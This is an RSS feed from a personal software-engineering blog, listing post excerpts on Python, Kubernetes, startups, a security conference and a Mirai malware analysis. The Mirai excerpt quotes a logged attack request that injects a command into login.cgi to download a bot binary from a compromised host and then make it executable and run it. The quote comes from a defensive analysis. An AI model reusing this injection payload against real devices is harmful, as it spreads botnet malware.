<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Posts on Race Conditions</title>
    <link>http://blog.race-conditions.net/posts/</link>
    <description>Recent content in Posts on Race Conditions</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-us</language>
    <copyright>Copyright &amp;copy; 2018 - Camilla Montonen</copyright>
    <lastBuildDate>Tue, 23 Apr 2019 18:28:10 +0200</lastBuildDate>
    
	<atom:link href="http://blog.race-conditions.net/posts/index.xml" rel="self" type="application/rss+xml" />
    
    
    <item>
      <title>Team Antipatterns: Conflicting Priorities</title>
      <link>http://blog.race-conditions.net/posts/team-antipatterns-conflicting-priorities/</link>
      <pubDate>Tue, 23 Apr 2019 18:28:10 +0200</pubDate>
      
      <guid>http://blog.race-conditions.net/posts/team-antipatterns-conflicting-priorities/</guid>
      <description>A side-channel attack on developer productivity.
I&amp;rsquo;ve been around the tech industry block a few times now, first as a QA engineer, then a data engineer, then a software engineer and afterwards as an independent software contractor and consulting business owner. Although all of this has happened in the span of a bit over four years, I&amp;rsquo;ve learnt a lot about the different kinds of teams that develop software. In this &amp;ldquo;Team Antipatterns&amp;rdquo; series, I&amp;rsquo;d like to make notes and highlight some (perhaps obvious) things that I&amp;rsquo;ve encountered during my time in tech.</description>
    </item>
    
    <item>
      <title>Solar and Solstice - Two Mirai Variants</title>
      <link>http://blog.race-conditions.net/posts/solar-and-solstice-two-mirai-variants/</link>
      <pubDate>Mon, 22 Apr 2019 16:18:52 +0200</pubDate>
      
      <guid>http://blog.race-conditions.net/posts/solar-and-solstice-two-mirai-variants/</guid>
      <description>Notes on Solar and Solstice binaries.
Strange Visitors in the Access Logs A few days (or maybe it was weeks), after I launched a public facing web service (a visual colour search engine I wrote a bit more about in this post) I started seeing some strange entries in the access logs.
&amp;quot;&amp;lt;source ip redacted&amp;gt; - - [20/Apr/2019:14:11:03 +0000] &amp;quot;GET /login.cgi?cli=aa%20aa%27; wget%20http://&amp;lt;compromised host redacted&amp;gt;/bins/Rep.mips%20-O%20-&amp;gt;%20/tmp/.Solar; chmod%20777%20/tmp/.Solar;/tmp/.Solar%20Dlink.mips%27$ HTTP/1.1&amp;quot; 404 233 &amp;quot;-&amp;quot; &amp;quot;Solar/9.</description>
    </item>
    
    <item>
      <title>Building a Visual Lipcolour Search Engine</title>
      <link>http://blog.race-conditions.net/posts/building-a-visual-lipcolour-search-engine/</link>
      <pubDate>Wed, 09 Jan 2019 17:58:59 +0000</pubDate>
      
      <guid>http://blog.race-conditions.net/posts/building-a-visual-lipcolour-search-engine/</guid>
      <description>Last April, I had an idea for a new kind of search engine that would help me solve a minor problem I&amp;rsquo;d had a few months before. Those who have seen me in person can probably guess that I am no stranger to outlandish and sometimes experimental lipcolours and so in my quest to create more and more outlandish liplooks (for funzies), I&amp;rsquo;d spend more and more time a) seeing pictures of cool liplooks and wonder &amp;lsquo;what lipcolour is that person wearing?</description>
    </item>
    
    <item>
      <title>Notes About Decorators</title>
      <link>http://blog.race-conditions.net/posts/notes-about-decorators/</link>
      <pubDate>Thu, 06 Dec 2018 19:14:10 +0000</pubDate>
      
      <guid>http://blog.race-conditions.net/posts/notes-about-decorators/</guid>
      <description>Decorators are one language feature in Python that I frequently use as a consumer of libraries and frameworks such as Flask but rarely implement myself. It&amp;rsquo;s time to revisit this feature! Thank you very much to Mark Lutz&amp;rsquo;s discussion in the 5th Edition of Learning Python. All mistakes are my own and feedback and comments are always appreciated.
Decorators are a way to augment Python functions and classes. They do this by providing a syntax that allows us to associate code that should be run before/after a call to a function or a class.</description>
    </item>
    
    <item>
      <title>Lessons From One Year of Bootstrapping</title>
      <link>http://blog.race-conditions.net/posts/lessons-from-one-year-of-bootstrapping/</link>
      <pubDate>Mon, 26 Nov 2018 21:18:32 +0000</pubDate>
      
      <guid>http://blog.race-conditions.net/posts/lessons-from-one-year-of-bootstrapping/</guid>
      <description>If they don&amp;rsquo;t give you a seat at the table&amp;hellip; Last July I decided to take a plunge and try to start a technology company. It felt like a idea good time: I felt that I had come to a standstill in my current software engineering role and needed a new challenge. While &amp;lsquo;needing a new challenge&amp;rsquo; on its own is not a good enough reason to take the financial and career risk that is trying to create a company, I wanted to see if maybe trying to forge my own opportunities would be better than trying to knock down doors that were closed to me.</description>
    </item>
    
    <item>
      <title>Blackhoodie18 Berlin Bootcamp Report</title>
      <link>http://blog.race-conditions.net/posts/blackhoodie18-berlin-bootcamp-report/</link>
      <pubDate>Tue, 20 Nov 2018 18:17:24 +0000</pubDate>
      
      <guid>http://blog.race-conditions.net/posts/blackhoodie18-berlin-bootcamp-report/</guid>
      <description>In my previous post I wrote a few notes about the Blackhoodie18 Conference day. In this post, I&amp;rsquo;ll do a brief overview of some of the topics that were covered in the two day (intensive!) bootcamp. For some reason(most likely I did not read the track descriptions closely enough), I applied to track 3. The name (on my way to rock as hell) sounded super cool and I was really intrigued by the topics that were covered (intro to crypto, intro to Return Oriented Programming (ROP) and intro to Windows Kernel internals via building a keylogger).</description>
    </item>
    
    <item>
      <title>Blackhoodie18 Berlin Conference Report</title>
      <link>http://blog.race-conditions.net/posts/blackhoodie18-berlin-report/</link>
      <pubDate>Tue, 20 Nov 2018 18:17:24 +0000</pubDate>
      
      <guid>http://blog.race-conditions.net/posts/blackhoodie18-berlin-report/</guid>
      <description>Blackhoodie RE - a one day conference(which I&amp;rsquo;ll be talking about in this blogpost) and two-day intensive security topics bootcamp(next blogpost) - took place this weekend in Berlin and I was fortunate enough to be able to attend! Phew! The weather was cold (hi Berlin, you remind me of Helsinki!), but my braincircuits were still overclocked by all the great talks and the two day bootcamp in Track 3 - lots of crypto, Return Oriented Programming and exploits, and Windows Kernel internals.</description>
    </item>
    
    <item>
      <title>What Makes a Good Technologist</title>
      <link>http://blog.race-conditions.net/posts/what-makes-a-good-technologist/</link>
      <pubDate>Tue, 06 Nov 2018 17:33:18 +0000</pubDate>
      
      <guid>http://blog.race-conditions.net/posts/what-makes-a-good-technologist/</guid>
      <description>A recent job application asked me to reflect on the characteristics that define a good data scientists. I really liked the question and the kinds of thoughts it generated in my mind, so I decided to poke around this topic a bit more and think about the kinds of qualities that make a good technologist. The term technologist is quite broad in scope - indeed, most of the appliances we use in every day life (including writing - the applicance I&amp;rsquo;m using to communicate with right now!</description>
    </item>
    
    <item>
      <title>Mobile Web App Prototyping With Flask</title>
      <link>http://blog.race-conditions.net/posts/mobile-prototyping-with-flask/</link>
      <pubDate>Thu, 01 Nov 2018 17:50:58 +0000</pubDate>
      
      <guid>http://blog.race-conditions.net/posts/mobile-prototyping-with-flask/</guid>
      <description>A big chunk of traffic for any modern web application comes from mobile devices and so developing with smaller screensizes and touch screen controls in mind is imperative when building a startup MVP. This was my first mistake when I started developing the visual colour search engine lipcolourmatch.com. As a developer my work environment is the desktop and so naturally the first iteration of the Flask application was built with the desktop in mind.</description>
    </item>
    
    <item>
      <title>Working With Kubernetes Deployments</title>
      <link>http://blog.race-conditions.net/posts/working-with-kubernetes-deployments/</link>
      <pubDate>Fri, 26 Oct 2018 21:26:40 +0100</pubDate>
      
      <guid>http://blog.race-conditions.net/posts/working-with-kubernetes-deployments/</guid>
      <description>When I first started working with Kubernetes Deployments, the defacto way to create a deployment was to write up some configuration into a YAML file and run kubectl --namespace=&amp;lt;somespace&amp;gt; apply -f &amp;lt;file&amp;gt;. This made it easy to make changes to the deployment later. Simply, make the required changes in the file and run kubectl --namespace=&amp;lt;somespace&amp;gt; apply -f &amp;lt;filename&amp;gt;. However, recently after following some Google Kubernetes Engine tutorials, I&amp;rsquo;ve gotten into a habit of creating deployments using the kubectl --namespace=&amp;lt;somespace&amp;gt; run command.</description>
    </item>
    
    <item>
      <title>On Trust</title>
      <link>http://blog.race-conditions.net/posts/on-trust/</link>
      <pubDate>Thu, 12 Jul 2018 00:40:08 +0100</pubDate>
      
      <guid>http://blog.race-conditions.net/posts/on-trust/</guid>
      <description>At a recent retrospective, the team was asked to reflect on the Agile values: Trust, Focus, etc. I was interested to see that trust had come up. In particular, it made me think about the Code Review process and how we, as developers, are often extremely quick to jump to conclusions about a technical decisions that to us seems &amp;lsquo;silly&amp;rsquo;, &amp;lsquo;stupid&amp;rsquo;, &amp;lsquo;idiotic&amp;rsquo;, &amp;lsquo;why would you do that&amp;rsquo; and how this manifests itself in the comments we give to each other during code reviews.</description>
    </item>
    
    <item>
      <title>Notes on Interviewing for Python Developer Roles</title>
      <link>http://blog.race-conditions.net/posts/notes-on-interviewing-python/</link>
      <pubDate>Fri, 15 Jun 2018 14:25:58 +0100</pubDate>
      
      <guid>http://blog.race-conditions.net/posts/notes-on-interviewing-python/</guid>
      <description>A few months ago, I opened my Twitter DMs for questions about tech interviews for Python developer roles. I received lots of great questions from junior developers looking for their first software engineering role and from more experienced developers looking to make a change to Python development. Because there seems to be sufficient interest in interviewing for Python dev roles, I&amp;rsquo;ve decided to compile the notes that I&amp;rsquo;ve taken over my four years of interviewing for Python developer roles and publish them here for the benefit of anyone applying or thinking of applying for a Python developer job.</description>
    </item>
    
    <item>
      <title>Software Engineer Contracting in the UK</title>
      <link>http://blog.race-conditions.net/posts/software-engineer-contracting-in-the-uk/</link>
      <pubDate>Tue, 12 Jun 2018 13:46:40 +0100</pubDate>
      
      <guid>http://blog.race-conditions.net/posts/software-engineer-contracting-in-the-uk/</guid>
      <description>Last summer, I handed in my resignation at BigCorp. Although there is no doubt that some personal exhaustion played a role in my decision to leave, the main catalyst was the professional wall that I had reached as a software engineer. The system I had built and maintained for the past months was stable. We were just reaching the final stages of improvements that would fix the last remaining niggles.</description>
    </item>
    
    <item>
      <title>Hello Again, World!</title>
      <link>http://blog.race-conditions.net/posts/new-blog/</link>
      <pubDate>Tue, 15 May 2018 18:13:51 +0100</pubDate>
      
      <guid>http://blog.race-conditions.net/posts/new-blog/</guid>
      <description>I have been blogging about the technology industry, software engineering and machine learning for a while over at winterflower.github.io. Recently, I&amp;rsquo;ve also accumulated lots of notes about various technical and tech career related topics that I would like to share and so I&amp;rsquo;m starting up a new blog, here at race-conditions.
As some of you may know, I left my permanent software engineer position last July to focus on bootstrapping an open source technology company here in London.</description>
    </item>
    
  </channel>
</rss>